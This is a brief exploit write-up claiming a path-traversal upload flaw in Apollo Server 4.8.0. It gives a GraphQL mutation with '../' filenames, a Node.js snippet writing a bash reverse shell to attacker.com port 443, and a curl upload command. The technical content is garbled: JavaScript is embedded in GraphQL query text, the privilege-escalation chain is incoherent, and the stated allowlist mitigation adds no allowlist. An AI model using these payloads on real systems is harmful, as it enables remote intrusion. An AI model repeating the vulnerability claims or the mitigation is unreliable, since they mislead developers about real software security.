Vulnerability: In Apollo Server 4.8.0, the default upload scalar “Upload” resolver does **not** enforce file extension validation and writes to the cwd.
Mutation:
mutation {
  singleUpload(file: {createReadStream: () => fs.createReadStream('/etc/passwd'), filename: "../../../../../../../../tmp/shell.sh"}) {
    filename
  }
}
Exploit steps:
1. Craft Node.js loader:
   const stream = fs.createWriteStream("/tmp/shell.sh");
   stream.write("#!/bin/bash\nbash -i >& /dev/tcp/attacker.com/443 0>&1");
   stream.end();
2. Upload via curl:
   curl -X POST https://api.example.com/graphql \
   -H "Content-Type: multipart/form-data" \
   -F operations='{ "query": "mutation { singleUpload(file: {createReadStream: () => fs.createReadStream('/tmp/shell.sh'), filename: \"../../../tmp/evil.js\"}) { filename } } }' \
   -F map='{ "0": ["variables.file"]}' \
   -F 0=@shell.sh

Backend writes evil.js to /tmp/evil.js via Apollo’s FileStream._write.
Privilege escalation: automount triggers /tmp/evil.js → systemd unit → cap_net_raw.

Mitigation:
• Add file type allowlist:
```
const { ApolloServer } = require('@apollo/server');
const { GraphQLUpload } = require('graphql-upload');
const server = new ApolloServer({ uploads: false, typeDefs, resolvers });
```
• Use express-fileupload middleware with extension filter:
app.use(fileUpload({ useTempFiles: true, tempFileDir: '/tmp', safeFileNames: true, preserveExtension: true }));

